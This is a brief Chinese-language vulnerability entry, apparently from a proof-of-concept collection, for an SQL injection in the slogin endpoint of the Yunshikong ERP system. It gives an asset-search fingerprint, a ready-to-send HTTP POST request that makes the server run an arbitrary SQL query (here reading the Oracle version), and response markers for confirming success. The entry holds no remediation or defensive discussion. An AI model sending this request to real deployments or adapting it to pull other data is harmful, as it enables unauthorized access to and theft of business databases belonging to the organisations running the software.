﻿# 云时空社会化商业ERP系统slogin SQL注入漏洞

> 更新时间：2024-04-19

> 漏洞编号：

> 漏洞说明：云时空社会化商业ERP系统slogin存在SQL注入漏洞，攻击者可以通过此漏洞获取数据库敏感信息。

> 漏洞特征： app="云时空社会化商业ERP系统"

> 验证脚本：HTTP

```
POST /slogin/service?service=db.select HTTP/1.1
Content-Type: application/x-www-form-urlencoded

params=%7B%22sql%22%3A%22SELECT+%2A+FROM+V%24VERSION%22%7D
```

> 响应代码特征：200

> 响应内容特征：values

> 上传文件定位：

> 验证文件来源：云时空社会化商业ERP系统slogin SQL注入漏洞.poc

